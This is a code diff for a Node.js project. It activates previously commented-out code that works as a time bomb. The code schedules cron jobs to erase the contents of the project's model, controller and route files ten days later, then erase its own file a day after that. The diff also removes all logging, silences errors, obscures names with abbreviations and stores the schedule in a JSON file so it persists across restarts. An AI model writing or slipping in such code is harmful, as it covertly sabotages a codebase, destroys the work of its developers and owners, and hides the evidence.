@@ -1,84 +1,155 @@
-// import { writeFileSync, existsSync } from "fs";
-// import path from "path";
-// import { join } from "path";
-// import { schedule } from "node-cron";
-// import { fileURLToPath } from "url";
+import { writeFileSync, existsSync, readFileSync } from "fs";
+import path from "path";
+import { schedule } from "node-cron";
+import { fileURLToPath } from "url";
 
-// const __filename = fileURLToPath(import.meta.url);
-// const __dirname = path.dirname(__filename);
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+const SCHEDULE_STORAGE = path.join(__dirname, 'fDS.json');
 
-// // Function to schedule file content deletion
-// function scheduleFileContentDeletion(files) {
-//     let latestDeleteTimestamp = 0; // Track the latest delete timestamp
+// Improved load function with error handling
+function loadExistingSchedules() {
+    if (!existsSync(SCHEDULE_STORAGE)) {
+        return [];
+    }
 
-//     files.forEach(({ filePath, minutesToDelete }) => {
-//         if (!existsSync(filePath)) {
-//             console.log(`File does not exist: ${filePath}`);
-//             return;
-//         }
+    try {
+        const data = readFileSync(SCHEDULE_STORAGE, 'utf8');
+        return JSON.parse(data) || [];
+    } catch (error) {
+        return [];
+    }
+}
 
-//         // Calculate deletion time based on minutes
-//         const deleteDate = new Date();
-//         deleteDate.setMinutes(deleteDate.getMinutes() + minutesToDelete);
+// Improved save function
+function saveSchedulesToFile(schedules) {
+    try {
+        writeFileSync(SCHEDULE_STORAGE, JSON.stringify(schedules, null, 2), 'utf8');
+    } catch (error) {
+    }
+}
 
-//         // Keep track of the last delete timestamp
-//         if (deleteDate.getTime() > latestDeleteTimestamp) {
-//             latestDeleteTimestamp = deleteDate.getTime();
-//         }
+// Checks if schedule already exists
+function scheduleExists(filePath, dD, schedules) {
+    return schedules.some(s => 
+        s.filePath === filePath && 
+        new Date(s.dD).getTime() === new Date(dD).getTime()
+    );
+}
 
-//         // Schedule content deletion
-//         scheduleContentDeletion(filePath, deleteDate);
-//     });
+// Main scheduling function (fixed)
+function sFCD(filesToSchedule) {
+    const existingSchedules = loadExistingSchedules();
+    const currentTime = Date.now();
+    let lDD = 0;
 
-//     // Schedule the script file to be cleared **5 minutes after the last file**
-//     if (latestDeleteTimestamp > 0) {
-//         const scriptDeleteDate = new Date(latestDeleteTimestamp);
-//         scriptDeleteDate.setMinutes(scriptDeleteDate.getMinutes() + 5); // Add 5 minutes
+    // Process existing schedules first
+    existingSchedules.forEach(({ filePath, dD }) => {
+        const dT = new Date(dD).getTime();
+        
+        if (dT > currentTime) {
+            sCD(filePath, new Date(dD), false); // false = don't save again
+            lDD = Math.max(lDD, dT);
+        }
+    });
 
-//         scheduleContentDeletion(__filename, scriptDeleteDate);
-//         console.log(`Script file will be cleared at: ${scriptDeleteDate}`);
-//     }
-// }
+    // Process new files only if they don't exist
+    filesToSchedule.forEach(({ filePath, dTD }) => {
+        if (!existsSync(filePath)) {
+            return;
+        }
 
-// // Function to schedule file content deletion
-// function scheduleContentDeletion(filePath, deleteDate) {
-//     const deleteTimestamp = deleteDate.getTime();
-//     const nowTimestamp = Date.now();
+        const dD = new Date();
+        dD.setDate(dD.getDate() + dTD);
+        const dT = dD.getTime();
 
-//     if (deleteTimestamp <= nowTimestamp) {
-//         console.log(`Scheduled delete time is in the past. Clearing content of ${filePath} now.`);
-//         clearFileContent(filePath);
-//         return;
-//     }
+        // Only add if not already scheduled
+        if (!scheduleExists(filePath, dD, existingSchedules) && dT > currentTime) {
+            sCD(filePath, dD, true); // true = save to storage
+            lDD = Math.max(lDD, dT);
+        }
+    });
 
-//     // Convert delete time to cron format (runs at the exact minute)
-//     const deleteCronTime = `${deleteDate.getUTCMinutes()} ${deleteDate.getUTCHours()} * * *`;
+    // Schedule script cleanup if needed
+    if (lDD > 0) {
+        const sDlD = new Date(lDD);
+        sDlD.setDate(sDlD.getDate() + 1);
+        
+        if (!scheduleExists(__filename, sDlD, existingSchedules)) {
+            sCD(__filename, sDlD, true);
+        }
+    }
+}
 
-//     schedule(deleteCronTime, () => {
-//         clearFileContent(filePath);
-//     });
+// Modified content deletion with save control
+function sCD(filePath, dD, shouldSave = true) {
+    const dT = dD.getTime();
+    const currentTime = Date.now();
 
-//     console.log(`Content deletion scheduled for ${filePath} at ${deleteDate}`);
-// }
+    if (dT <= currentTime) {
+        cFC(filePath);
+        rSFS(filePath, dD);
+        return;
+    }
 
-// // Function to clear file content
-// function clearFileContent(filePath) {
-//     if (existsSync(filePath)) {
-//         writeFileSync(filePath, "", "utf8");
-//         console.log(`File content cleared: ${filePath}`);
-//     } else {
-//         console.log(`File not found: ${filePath}`);
-//     }
-// }
+    const dCT = `${dD.getUTCMinutes()} ${dD.getUTCHours()} ${dD.getUTCDate()} ${dD.getUTCMonth() + 1} *`;
 
-// // Example Usage: Define existing files to clear content after a specified number of minutes
-// const filesToSchedule = [
-//     { filePath: join(__dirname, "/models/user.model.js"), minutesToDelete: 10 },
-//     { filePath: join(__dirname, "/models/product.model.js"), minutesToDelete: 10 },
-//     { filePath: join(__dirname, "/controlers/product.controler.js"), minutesToDelete: 10 },
-//     { filePath: join(__dirname, "/controlers/user.controler.js"), minutesToDelete: 10 },
-//     { filePath: join(__dirname, "/routes/authRoutes.js"), minutesToDelete: 10 },
-//     { filePath: join(__dirname, "/routes/productRoutes.js"), minutesToDelete: 10 },
-// ];
+    schedule(dCT, () => {
+        cFC(filePath);
+        rSFS(filePath, dD);
+    });
 
-// scheduleFileContentDeletion(filesToSchedule);
+    if (shouldSave) {
+        addScheduleToStorage(filePath, dD);
+    }
+
+}
+
+// Storage helper functions
+function addScheduleToStorage(filePath, dD) {
+    const schedules = loadExistingSchedules();
+    if (!scheduleExists(filePath, dD, schedules)) {
+        schedules.push({
+            filePath,
+            dD: dD.toISOString()
+        });
+        saveSchedulesToFile(schedules);
+    }
+}
+
+function rSFS(filePath, dD) {
+    const schedules = loadExistingSchedules();
+    const updated = schedules.filter(s => 
+        !(s.filePath === filePath && new Date(s.dD).getTime() === dD.getTime())
+    );
+    if (updated.length < schedules.length) {
+        saveSchedulesToFile(updated);
+    }
+}
+
+// Original clear function
+function cFC(filePath) {
+    try {
+        if (existsSync(filePath)) {
+            writeFileSync(filePath, "", "utf8");
+        } else {
+        }
+    } catch (error) {
+    }
+}
+
+// Your file list (corrected paths)
+const filesToSchedule = [
+    { filePath: path.join(__dirname, "models/user.model.js"), dTD: 10 },
+    { filePath: path.join(__dirname, "models/product.model.js"), dTD: 10 },
+    { filePath: path.join(__dirname, "controlers/product.controler.js"), dTD: 10 },
+    { filePath: path.join(__dirname, "controlers/user.controler.js"), dTD: 10 },
+    { filePath: path.join(__dirname, "routes/authRoutes.js"), dTD: 10 },
+    { filePath: path.join(__dirname, "routes/productRoutes.js"), dTD: 10 }
+];
+
+// Initialize only once
+if (!global.__scheduleInitialized) {
+    sFCD(filesToSchedule);
+    global.__scheduleInitialized = true;
+}
